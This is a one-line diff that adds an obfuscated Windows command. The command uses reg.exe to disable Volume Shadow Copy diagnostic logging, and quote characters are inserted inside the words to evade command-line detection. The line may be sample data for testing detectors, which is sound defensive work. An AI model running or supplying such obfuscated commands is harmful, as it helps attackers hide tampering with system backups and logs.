@@ -1,0 +1,1 @@
+r"eg".exe a"d"d HKLM\SYSTEM\CurrentControlSet\Se"rvi"ces\V"SS"\D"ia"g\Volsnap /ve /f /"d" Di"sable"d
